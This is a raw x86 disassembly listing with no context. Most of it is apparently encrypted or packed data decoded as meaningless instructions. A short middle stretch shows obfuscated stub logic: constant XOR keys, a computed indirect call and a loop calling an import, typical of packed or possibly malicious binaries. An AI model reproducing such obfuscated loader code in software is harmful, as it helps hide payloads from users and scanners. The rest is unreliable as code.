  408a3a:	xor    DWORD PTR [edi],edi
  408a3c:	dec    ebp
  408a3d:	pop    esi
  408a3e:	repnz push 0x3a
  408a41:	sbb    bh,BYTE PTR [edi]
  408a43:	int    0x85
  408a45:	mov    eax,ds:0x3fcaeaa4
  408a4a:	mov    esp,0xa59c0c43
  408a4f:	sub    eax,0xf14c3774
  408a54:	xor    edx,0xa55f9d92
  408a5a:	jecxz  0x408ad7
  408a5c:	cmp    esp,DWORD PTR [esi-0x99bd09c]
  408a62:	mov    ecx,0x48c50d45
  408a67:	mov    dl,0x70
  408a69:	int    0x12
  408a6b:	xor    DWORD PTR [ebx],0x5cd712a0
  408a71:	cwde   
  408a72:	in     eax,dx
  408a73:	stos   DWORD PTR es:[edi],eax
  408a74:	pop    ebp
  408a75:	adc    BYTE PTR [esi+0x506d6dce],cl
  408a7b:	dec    esp
  408a7c:	xchg   edi,eax
  408a7d:	push   esp
  408a7e:	adc    edi,DWORD PTR [eax]
  408a80:	cmp    dl,BYTE PTR [eax-0x21]
  408a83:	clc    
  408a84:	adc    DWORD PTR [ebx],edi
  408a86:	xor    BYTE PTR [ebp+0xf3a939b],cl
  408a8c:	daa    
  408a8d:	push   ecx
  408a8e:	push   ecx
  408a8f:	hlt    
  408a90:	dec    edx
  408a91:	repnz adc eax,0x51a103e2
  408a97:	xlat   BYTE PTR ds:[ebx]
  408a98:	mov    esi,0x6036e852
  408a9d:	outs   dx,BYTE PTR ds:[esi]
  408a9e:	icebp  
  408a9f:	xor    BYTE PTR [edi+0x3b],ch
  408aa2:	adc    BYTE PTR [ecx],al
  408aa4:	jl     0x408a5c
  408aa6:	(bad)  gs:[eax+edi*8]
  408aaa:	dec    esp
  408aab:	inc    esp
  408aac:	cmc    
  408aad:	mov    BYTE PTR [eax+esi*8+0x5b],bl
  408ab1:	jmp    0x4497:0x2d76edbb
  408ab8:	into   
  408ab9:	push   esi
  408aba:	ss jp  0x408a64
  408abd:	repnz dec esp
  408abf:	jae    0x408b28
  408ac1:	push   esp
  408ac2:	pop    ebx
  408ac3:	sbb    eax,0x8e0fd12d
  408ac8:	inc    edi
  408ac9:	mov    WORD PTR [ecx+0x20],fs
  408acc:	das    
  408acd:	jmp    0xc43179e6
  408ad2:	inc    ecx
  408ad3:	add    BYTE PTR [ebp+0x511a4abf],bl
  408ad9:	xchg   edx,eax
  408ada:	in     eax,dx
  408adb:	outs   dx,DWORD PTR ds:[esi]
  408adc:	lods   eax,DWORD PTR ds:[esi]
  408add:	scas   al,BYTE PTR es:[edi]
  408ade:	mov    ecx,0xd025f255
  408ae3:	je     0x408ad7
  408ae5:	adc    esp,DWORD PTR [ecx]
  408ae7:	adc    esp,DWORD PTR [edx+0x53]
  408aea:	and    ch,bh
  408aec:	les    ebp,FWORD PTR [ebp+0x6ffd719b]
  408af2:	not    dh
  408af4:	xor    BYTE PTR [edx+eax*4+0x10339932],ah
  408afb:	cmp    BYTE PTR [ecx-0x11d7940a],bl
  408b01:	cs mov dh,0x26
  408b04:	or     ebp,edx
  408b06:	ins    DWORD PTR es:[edi],dx
  408b07:	dec    ax
  408b09:	inc    esi
  408b0a:	aam    0x83
  408b0c:	mov    ch,0x80
  408b0e:	pop    ecx
  408b0f:	push   eax
  408b10:	adc    edi,DWORD PTR [esi-0x1d0e2f95]
  408b16:	push   esi
  408b17:	add    DWORD PTR ds:0xdc3f1e7e,esi
  408b1d:	jmp    0xa4afefff
  408b22:	sbb    BYTE PTR [edx],bl
  408b24:	jecxz  0x408b90
  408b26:	push   0xffffff89
  408b28:	ss (bad) 
  408b2a:	lods   al,BYTE PTR ds:[esi]
  408b2b:	(bad)  
  408b2c:	mov    al,ds:0x429ec1a2
  408b31:	jle    0x408b69
  408b33:	ds loope 0x408b37
  408b36:	cld    
  408b37:	arpl   WORD PTR [eax+0x2c],cx
  408b3a:	rol    BYTE PTR [ebx-0x1e0e0024],1
  408b40:	idiv   BYTE PTR [ebp+0x9]
  408b43:	push   DWORD PTR [ecx-0x51]
  408b46:	xchg   esp,eax
  408b47:	into   
  408b48:	in     al,0xfd
  408b4a:	pop    ebx
  408b4b:	sub    BYTE PTR [ebx],ch
  408b4d:	xchg   ecx,eax
  408b4e:	popa   
  408b4f:	mov    al,ds:0x94a82888
  408b54:	inc    eax
  408b55:	push   ds
  408b56:	cmp    dh,BYTE PTR [ebx+ebx*4+0x5d53ceec]
  408b5d:	push   edx
  408b5e:	pushf  
  408b5f:	xor    eax,0xad224a88
  408b64:	(bad)  
  408b66:	adc    DWORD PTR ds:0x2888820b,0xa43b1719
  408b70:	xor    al,0xa7
  408b72:	and    eax,0x5bd6e7ac
  408b77:	and    BYTE PTR [edx+edi*2+0xe],0xda
  408b7c:	jecxz  0x408afe
  408b7e:	jp     0x408b0d
  408b80:	mov    ebx,0x43c492be
  408b85:	jmp    0x9122d99
  408b8a:	cli    
  408b8b:	sub    BYTE PTR [edx+0x21],ah
  408b8e:	sub    eax,0x36def727
  408b93:	sbb    BYTE PTR [ebp-0x2c],dh
  408b96:	ret    0x152c
  408b99:	mov    ds:0xbbc1145c,al
  408b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b9f:	enter  0xffb1,0xd
  408ba3:	sar    BYTE PTR [ecx],cl
  408ba5:	mov    ds:0x8387e746,eax
  408baa:	jle    0x408b96
  408bac:	sub    dh,BYTE PTR [eax-0x69]
  408baf:	in     eax,0xf
  408bb1:	dec    edi
  408bb2:	and    BYTE PTR [eax+0x7384f956],cl
  408bb8:	cmp    BYTE PTR [ebp-0x1b7bcddc],dl
  408bbe:	fs (bad) 
  408bc0:	sub    eax,esi
  408bc2:	pop    ebp
  408bc3:	sub    DWORD PTR [esi],edi
  408bc5:	mov    dh,0x72
  408bc7:	pop    esp
  408bc8:	dec    DWORD PTR [edi+0x38]
  408bcb:	mov    ah,bh
  408bcd:	push   cs
  408bce:	mov    ebp,es
  408bd0:	sbb    edx,DWORD PTR [esi+eax*8]
  408bd3:	xor    eax,0x7b8b5de6
  408bd8:	cs pop es
  408bda:	int3   
  408bdb:	xchg   ebx,eax
  408bdc:	je     0x408bee
  408bde:	mov    esi,0xc7482401
  408be3:	mov    BYTE PTR [eax],ch
  408be5:	arpl   WORD PTR [eax],si
  408be7:	xchg   edi,eax
  408be8:	sbb    BYTE PTR ds:0x146c650e,al
  408bee:	ds sub ah,al
  408bf1:	int3   
  408bf2:	inc    esi
  408bf3:	inc    edx
  408bf4:	fimul  WORD PTR [esi+0x3719f5f3]
  408bfa:	push   edx
  408bfb:	add    DWORD PTR [ebx+0x29],ebp
  408bfe:	stos   DWORD PTR es:[edi],eax
  408bff:	mov    al,ds:0xc5af899a
  408c04:	arpl   si,sp
  408c06:	pop    ds
  408c07:	inc    edi
  408c08:	and    DWORD PTR [esi-0x49],0xfffffff1
  408c0c:	cmp    eax,0x635613c2
  408c11:	jo     0x408bf6
  408c13:	and    BYTE PTR [edx-0x48],dl
  408c16:	pop    ebx
  408c17:	cwde   
  408c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c19:	stos   DWORD PTR es:[edi],eax
  408c1a:	shl    DWORD PTR [eax+0xd209163],0x9
  408c21:	xor    bl,ch
  408c23:	das    
  408c24:	retf   
  408c25:	in     eax,0x24
  408c27:	pop    ebp
  408c28:	add    eax,0xb2ad7d78
  408c2d:	inc    edx
  408c2e:	js     0x408cab
  408c30:	inc    edi
  408c31:	(bad)  
  408c32:	jl     0x408c18
  408c34:	push   ss
  408c35:	mov    bl,0x82
  408c37:	ja     0x408c08
  408c39:	imul   ecx,ebx,0x30
  408c3c:	xchg   ebx,eax
  408c3d:	outs   dx,DWORD PTR ds:[esi]
  408c3e:	xchg   BYTE PTR [esi+0x6c],cl
  408c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c42:	push   0x8aecb539
  408c47:	mov    DWORD PTR [edx-0xb],ebp
  408c4a:	fldln2 
  408c4c:	xchg   DWORD PTR [ebx+ebp*4],edx
  408c4f:	ret    
  408c50:	data16 aaa 
  408c52:	dec    ebp
  408c53:	jno    0x408bf7
  408c55:	or     BYTE PTR ds:0x6fbffedb,ah
  408c5b:	sub    al,0x55
  408c5d:	ja     0x408c80
  408c5f:	cmp    esi,DWORD PTR [edi]
  408c61:	aad    0xd3
  408c63:	mov    ecx,0x9e895305
  408c68:	cwde   
  408c69:	in     eax,0x46
  408c6b:	jne    0x408c86
  408c6d:	mov    ds:0x8fba897e,al
  408c72:	push   ebp
  408c73:	ds xchg ebx,eax
  408c75:	hlt    
  408c76:	scas   eax,DWORD PTR es:[edi]
  408c77:	pop    ebx
  408c78:	jo     0x408ca9
  408c7a:	clc    
  408c7b:	dec    edx
  408c7c:	pop    ebp
  408c7d:	lock ins BYTE PTR es:[edi],dx
  408c7f:	mov    ebx,0xae7e70f6
  408c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c85:	cs xchg ebp,eax
  408c87:	pop    esp
  408c88:	dec    edx
  408c89:	pop    edx
  408c8a:	xchg   edx,eax
  408c8b:	pushf  
  408c8c:	ss stos DWORD PTR es:[edi],eax
  408c8e:	add    dl,BYTE PTR [eax]
  408c90:	inc    esi
  408c91:	int    0xc5
  408c93:	mov    bh,BYTE PTR [eax+eiz*1-0x2378136e]
  408c9a:	stc    
  408c9b:	xchg   ebp,eax
  408c9c:	inc    eax
  408c9d:	mov    edx,0xb2f5b33b
  408ca2:	stc    
  408ca3:	or     eax,DWORD PTR [edi-0x7e]
  408ca6:	add    dl,BYTE PTR [ebp-0x69f880a5]
  408cac:	mov    cs,WORD PTR [ebx-0x5c]
  408caf:	lock push cs
  408cb1:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  408cb3:	jp     0x408ccd
  408cb5:	xchg   DWORD PTR [edx],esi
  408cb7:	(bad)  
  408cb8:	mov    bh,0x3a
  408cba:	push   esp
  408cbb:	pop    ss
  408cbc:	test   al,0xa4
  408cbe:	pop    esp
  408cbf:	ja     0x408ce7
  408cc1:	lahf   
  408cc2:	mov    esi,DWORD PTR [ecx-0x133f8147]
  408cc8:	push   ss
  408cc9:	dec    ecx
  408cca:	and    DWORD PTR [ebx],0xfffffffd
  408ccd:	jp     0x408cb8
  408ccf:	cmp    bh,al
  408cd1:	ja     0x408cf9
  408cd3:	jmp    0x1510a649
  408cd8:	ins    DWORD PTR es:[edi],dx
  408cd9:	sub    al,0x5d
  408cdb:	cs stos DWORD PTR es:[edi],eax
  408cdd:	sbb    esi,DWORD PTR [eax+0x30]
  408ce0:	in     al,0x1e
  408ce2:	sub    eax,0x20de3716
  408ce7:	icebp  
  408ce8:	adc    DWORD PTR [edi-0x4a45ebf5],esi
  408cee:	fimul  WORD PTR [ebx+edi*1+0x9]
  408cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cf3:	xor    al,0x1c
  408cf5:	ss sti 
  408cf7:	aad    0xfe
  408cf9:	shr    dh,1
  408cfb:	out    0x6c,eax
  408cfd:	and    DWORD PTR [ebx-0x6c],esi
  408d00:	enter  0x4d05,0x1e
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ff61
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0xa93327cf
  408e55:	imul   edi,DWORD PTR [ebx],0x62198a0f
  408e5b:	bound  ebp,QWORD PTR [ebx]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx+0x36]
  408e61:	jne    0x408e76
  408e63:	ins    BYTE PTR es:[edi],dx
  408e64:	jnp    0x408e80
  408e66:	ficom  WORD PTR es:[ecx+ecx*1+0x16]
  408e6b:	cli    
  408e6c:	scas   eax,DWORD PTR es:[edi]
  408e6d:	and    DWORD PTR [eax],esp
  408e6f:	pop    edi
  408e70:	mov    WORD PTR [eax],ds
  408e72:	gs jnp 0x408edf
  408e75:	mov    cl,0xa7
  408e77:	xchg   esp,edx
  408e79:	scas   eax,DWORD PTR es:[edi]
  408e7a:	mov    esp,fs
  408e7c:	div    BYTE PTR [ecx]
  408e7e:	ins    DWORD PTR es:[edi],dx
  408e7f:	cmp    al,0x41
  408e81:	xlat   BYTE PTR ds:[ebx]
  408e82:	pushf  
  408e83:	fdivrp st(0),st
  408e85:	sbb    ecx,edi
  408e87:	fdiv   st(3),st
  408e89:	(bad)  
  408e8a:	stos   BYTE PTR es:[edi],al
  408e8b:	jge    0x408e74
  408e8d:	jae    0x408e46
  408e8f:	sub    ebp,ecx
  408e91:	xchg   esi,eax
  408e92:	repnz dec ebx
  408e94:	inc    ebp
  408e95:	aam    0xa0
  408e97:	fs jmp 0x408eeb
  408e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9b:	lock lea edx,[eax+0xc]
  408e9f:	loope  0x408ef3
  408ea1:	cmp    BYTE PTR [ebx-0x6b8cf572],dl
  408ea7:	inc    ecx
  408ea8:	arpl   WORD PTR [edi],bx
  408eaa:	push   ss
  408eab:	mov    ds:0x2646ddd3,eax
  408eb0:	and    al,0x97
  408eb2:	jbe    0x408ea4
  408eb4:	push   esp
  408eb5:	aad    0x77
  408eb7:	push   ds
  408eb8:	inc    edi
  408eb9:	sahf   
  408eba:	sti    
  408ebb:	jecxz  0x408ecd
  408ebd:	in     eax,0x8d
  408ebf:	pop    ss
  408ec0:	pop    edi
  408ec1:	popa   
  408ec2:	scas   eax,DWORD PTR es:[edi]
  408ec3:	add    DWORD PTR [ecx+0xe3e01cd],edx
  408ec9:	push   0xb3d3e062
  408ece:	mov    dl,0x8a
  408ed0:	jb     0x408e8c
  408ed2:	popa   
  408ed3:	push   edi
  408ed4:	xor    ebx,edx
  408ed6:	popa   
  408ed7:	fs dec ebp
  408ed9:	push   0x4e64d991
  408ede:	mov    ecx,0xe6768d8a
  408ee3:	repz iret 
  408ee5:	ror    DWORD PTR [ebx+ecx*1-0x361f44d2],cl
  408eec:	mov    ecx,0x7fa12fbe
  408ef1:	jne    0x408f07
  408ef3:	jp     0x408f2b
  408ef5:	in     al,dx
  408ef6:	xor    ecx,DWORD PTR [eax-0xb]
  408ef9:	push   0x460ec5e0
  408efe:	(bad)  
  408f00:	retf   0xf4dc
  408f03:	sub    esi,esi
  408f05:	xchg   esi,eax
  408f06:	xchg   bh,bl
  408f08:	call   0x56f14ae7
  408f0d:	mov    dl,0x86
  408f0f:	cwde   
  408f10:	cmp    BYTE PTR [edi],al
  408f12:	iret   
  408f13:	call   0x197fef4e
  408f18:	aam    0xab
  408f1a:	lock pop ds
  408f1c:	add    dl,BYTE PTR [edi-0x612fa960]
  408f22:	and    al,0x8f
  408f24:	pop    ebx
  408f25:	in     al,dx
  408f26:	pop    esp
  408f27:	jae    0x408edc
  408f29:	push   ecx
  408f2a:	push   esp
  408f2b:	retf   
  408f2c:	add    BYTE PTR [ebp-0x71],ch
  408f2f:	jmp    0x408f5d
  408f31:	mov    eax,0x1417630e
  408f36:	fs pop eax
  408f38:	sub    DWORD PTR [eax],ebx
  408f3a:	adc    ecx,esi
  408f3c:	or     BYTE PTR [ecx],al
  408f3e:	pushf  
  408f3f:	bswap  esp
  408f41:	lods   al,BYTE PTR ds:[esi]
  408f42:	or     ah,BYTE PTR [esi-0x2d]
  408f45:	dec    ebx
  408f46:	add    eax,0x1298bd65
  408f4b:	ins    BYTE PTR es:[edi],dx
  408f4c:	pop    ebp
  408f4d:	dec    ebp
  408f4e:	xchg   ecx,eax
  408f4f:	add    dl,BYTE PTR [edx]
  408f51:	les    edx,FWORD PTR ds:0xcfcf5285
  408f57:	push   cs
  408f58:	jge    0x408f85
  408f5a:	jns    0x408f29
  408f5c:	retf   0x84dc
  408f5f:	les    ecx,FWORD PTR [eax]
  408f61:	daa    
  408f62:	or     eax,0x71e9015d
  408f67:	arpl   WORD PTR [ebx],ax
  408f69:	test   al,0x76
  408f6b:	push   ds
  408f6c:	jbe    0x408fd5
  408f6e:	leave  
  408f6f:	lahf   
  408f70:	jbe    0x408fdb
  408f72:	fmul   QWORD PTR [eax]
  408f74:	sahf   
  408f75:	jmp    0xeb98:0xefb29c4c
  408f7c:	cmc    
  408f7d:	arpl   WORD PTR [ebx*2-0x21cd57a2],di
  408f84:	cmc    
  408f85:	xchg   esi,eax
  408f86:	clc    
  408f87:	xchg   edx,eax
  408f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f89:	add    bh,dl
  408f8b:	out    0x77,al
  408f8d:	stos   BYTE PTR es:[edi],al
  408f8e:	(bad)  
  408f90:	scas   eax,DWORD PTR es:[edi]
  408f91:	and    cl,BYTE PTR [eax+0x39d4152c]
  408f97:	(bad)  
  408f98:	and    eax,0xba4bea40
  408f9d:	sub    ebx,DWORD PTR [ebx+ebx*2]
  408fa0:	mov    WORD PTR ds:0x532c77f0,?
  408fa6:	or     al,0xc4
  408fa8:	xchg   ebx,eax
  408fa9:	aas    
  408faa:	addr16 ret 0xc6d6
  408fae:	lods   eax,DWORD PTR ds:[esi]
  408faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb0:	rcl    BYTE PTR [edi-0x4d],0xb
  408fb4:	and    ebx,0x8f72841
  408fba:	fld    TBYTE PTR [eax-0x59]
  408fbd:	in     al,dx
  408fbe:	mov    bh,0x12
  408fc0:	xor    cl,dh
  408fc2:	xor    BYTE PTR [ecx+0xc72f426],ah
  408fc8:	repz mov edi,0x93b0c64
  408fce:	ror    DWORD PTR [ecx+0x5c],cl
  408fd1:	stos   BYTE PTR es:[edi],al
  408fd2:	lahf   
  408fd3:	pop    ebp
  408fd4:	and    esi,edi
  408fd6:	dec    eax
  408fd7:	call   0x6fa06b60
  408fdc:	sbb    eax,0x77592ec4
  408fe1:	(bad)  
  408fe5:	xchg   ebx,eax
  408fe6:	jns    0x408f6b
  408fe8:	call   0xc3d1:0x2627363b
  408fef:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ff1:	pop    esp
  408ff2:	xchg   ebx,eax
  408ff3:	mov    ch,0xcf
  408ff5:	fwait
  408ff6:	(bad)  
  408ff7:	es push es
  408ff9:	in     al,0x3b
  408ffb:	push   0xffffff9f
  408ffd:	mov    dh,0x5c
  408fff:	data16 arpl WORD PTR [edi-0x6c],sp
  409003:	in     eax,0x33
  409005:	sub    ah,BYTE PTR [ebx+ebx*1]
  409008:	xor    al,0x2d
  40900a:	sahf   
  40900b:	nop
  40900c:	or     edx,DWORD PTR [eax+0x4d]
  40900f:	aam    0x98
  409011:	xchg   di,ax
  409013:	xchg   ebx,eax
  409014:	popa   
  409015:	fimul  WORD PTR [edx+0x48]
  409018:	hlt    
  409019:	in     eax,dx
  40901a:	or     ebp,DWORD PTR [ebx+0x76]
  40901d:	push   ss
  40901e:	pop    ebx
  40901f:	scas   eax,DWORD PTR es:[edi]
  409020:	and    DWORD PTR [esi-0x41],edi
  409023:	or     al,0x90
  409025:	adc    DWORD PTR ds:0xaee4c75a,ebx
  40902b:	ss in  eax,dx
  40902d:	pop    esp
  40902e:	cwde   
  40902f:	mov    al,ds:0xa0db5264
  409034:	cmc    
  409035:	sahf   
  409036:	je     0x40906c
  409038:	daa    
  409039:	mov    dh,0x99
  40903b:	in     eax,dx
  40903c:	mov    ds:0x1d1f783,eax
  409041:	fidiv  DWORD PTR ds:0xfc42c6ff
  409047:	mov    ds:0x13d82cb3,al
  40904c:	add    eax,esi
  40904e:	dec    esi
  40904f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409050:	xchg   edi,eax
  409051:	dec    edx
  409052:	xchg   ecx,eax
  409053:	call   FWORD PTR [ebx]
  409055:	lahf   
  409056:	ins    DWORD PTR es:[edi],dx
  409057:	out    dx,eax
  409058:	sbb    eax,0xefb5fa8d
  40905d:	xchg   ebx,eax
  40905e:	out    dx,al
  40905f:	or     DWORD PTR [ebx],ecx
  409061:	inc    eax
  409062:	aad    0x48
  409064:	popf   
  409065:	lds    ebx,FWORD PTR [edi-0x52f125f2]
  40906b:	popf   
  40906c:	mov    ebx,0x56804d60
  409071:	ror    bl,1
  409073:	test   eax,0xc3f36ad8
  409078:	and    edi,0x2004b864
  40907e:	jb     0x409003
  409080:	or     dh,bl
  409082:	bound  edx,QWORD PTR ds:[esi+0x8]
  409086:	or     DWORD PTR [edx],0xffffff8d
  409089:	xchg   ebx,eax
  40908a:	jmp    0x6637:0x95940ce7
  409091:	ror    DWORD PTR [ebx+0x2836caad],cl
  409097:	dec    ecx
  409098:	sbb    DWORD PTR ss:[ebx+0x7dd0c571],ebp
  40909f:	xor    al,0x47
  4090a1:	jmp    0x3173:0x99c9b785
  4090a8:	lods   al,BYTE PTR ds:[esi]
  4090a9:	ret    0x1b6
  4090ac:	dec    edi
  4090ad:	sub    ch,al
  4090af:	rcl    DWORD PTR [esi-0x58],1
  4090b2:	sub    DWORD PTR [ebp-0x6],ebp
  4090b5:	scas   al,BYTE PTR es:[edi]
  4090b6:	add    esi,ebx
  4090b8:	test   dh,al
  4090ba:	and    al,0x31
  4090bc:	idiv   DWORD PTR [ebx+0x2b]
  4090bf:	fild   DWORD PTR fs:0x9e23edac
  4090c6:	stc    
  4090c7:	inc    edi
  4090c8:	les    esi,FWORD PTR [edx+ebx*2+0x64]
  4090cc:	adc    DWORD PTR [ebx+0x71],0xffffff8a
  4090d0:	nop
  4090d1:	fsubr  DWORD PTR [ebx]
  4090d3:	adc    eax,0xc4167c08
  4090d8:	test   eax,0x5e8d08fc
  4090dd:	xor    BYTE PTR [ecx+0x4e38b663],0xbc
  4090e4:	arpl   WORD PTR [edi+esi*4+0x7e],si
  4090e8:	inc    esp
  4090e9:	xchg   ebp,eax
  4090ea:	mov    esp,DWORD PTR [edx-0x71725ce2]
  4090f0:	push   ebx
  4090f1:	or     dl,bh
  4090f3:	into   
  4090f4:	repnz scas eax,DWORD PTR es:[edi]
  4090f6:	data16 or al,0x7e
  4090f9:	mov    esp,0xde22e427
  4090fe:	pop    eax
  4090ff:	ins    DWORD PTR es:[edi],dx
  409100:	enter  0x7aa0,0x59
  409104:	loope  0x4090c6
  409106:	push   ds
  409107:	push   esi
  409108:	in     al,dx
  409109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40910a:	pop    eax
  40910b:	cmp    cl,cl
  40910d:	mov    ah,0xe3
  40910f:	dec    eax
  409110:	ror    BYTE PTR [ecx+0x6b],cl
  409113:	mov    al,ds:0x31b1f8da
  409118:	jge    0x4090d5
  40911a:	std    
  40911b:	lods   al,BYTE PTR fs:[esi]
  40911d:	fidiv  DWORD PTR [edx-0x29]
  409120:	das    
  409121:	arpl   WORD PTR [eax],si
  409123:	aas    
  409124:	and    esp,DWORD PTR [edi+0x223822a1]
  40912a:	nop
  40912b:	dec    esi
  40912c:	addr16 push edi
  40912e:	dec    edi
  40912f:	and    ecx,DWORD PTR [ebx+0x4907f4a2]
  409135:	sub    DWORD PTR [ebx],ebp
  409137:	push   es
  409138:	icebp  
  409139:	pop    edi
  40913a:	pop    esp
  40913b:	mov    dl,0x81
  40913d:	xor    esp,DWORD PTR [edi+ebp*8]
  409140:	mov    eax,ds:0x1435cd59
  409145:	mov    dh,0xf4
  409147:	xchg   esi,eax
  409148:	fidiv  DWORD PTR [edi-0x2a735011]
  40914e:	arpl   WORD PTR [edx+edx*8],di
  409151:	(bad)  
  409152:	je     0x409139
  409154:	mov    eax,ds:0x1876805f
  409159:	jo     0x4090ec
  40915b:	inc    edx
  40915c:	(bad)  
  40915f:	call   0xefa1190b
  409164:	fxch   st(7)
  409166:	lods   al,BYTE PTR ds:[esi]
  409167:	in     al,0xfa
  409169:	push   0x4d
  40916b:	adc    DWORD PTR [edx-0x43],ebx
  40916e:	add    DWORD PTR [eax+0x16],ebp
  409171:	sbb    BYTE PTR [ecx+ebx*2],cl
  409174:	jecxz  0x4091f3
  409176:	xchg   DWORD PTR [eax+0x25],ebp
  409179:	pop    eax
  40917a:	fidiv  DWORD PTR [eax-0x51]
  40917d:	or     esi,DWORD PTR [eax]
  40917f:	(bad)  
  409181:	pusha  
  409182:	stc    
  409183:	mov    al,ds:0xabf88e76
  409188:	push   0x5
  40918a:	sub    bl,BYTE PTR [ebp-0x31]
  40918d:	(bad)  
  40918e:	into   
  40918f:	repz push esi
  409191:	mov    ebx,0x4e4e85cc
  409196:	adc    BYTE PTR [edi+ebp*2-0x6e],ch
  40919a:	or     al,BYTE PTR [ebx+0x5351b950]
  4091a0:	xchg   edi,eax
  4091a1:	jge    0x409207
  4091a3:	mov    ds:0x263474f2,al
  4091a8:	xchg   DWORD PTR [edx+edi*2+0x8],edx
  4091ac:	mov    BYTE PTR [ebp-0x3425392b],0xd
  4091b3:	jle    0x409203
  4091b5:	and    eax,0x3321cba7
  4091ba:	mov    esp,0xd4cf942
  4091bf:	jg     0x409189
  4091c1:	lea    edi,[ebp+0x58d6bb1]
  4091c7:	or     ecx,DWORD PTR [eax-0xeb2762f]
  4091cd:	call   0x18a5:0x118a4ff5
  4091d4:	add    edx,DWORD PTR [edi+edi*2+0x73]
  4091d8:	pop    ds
  4091d9:	or     DWORD PTR [esi-0x68796dcb],ebp
  4091df:	or     al,0x45
  4091e1:	data16 cmp al,0x6
  4091e4:	mov    WORD PTR [edx],?
  4091e6:	mov    cl,ah
  4091e8:	and    esp,edi
  4091ea:	xchg   ebx,eax
  4091eb:	push   esi
  4091ec:	push   eax
  4091ed:	mov    al,ds:0x67e46f5e
  4091f2:	push   esp
  4091f3:	in     eax,0xda
  4091f5:	mov    bl,0x55
  4091f7:	call   0x889071bd
  4091fc:	shl    DWORD PTR [ebx+0x7c],0x7f
  409200:	in     al,dx
  409201:	fs enter 0x9c45,0x6c
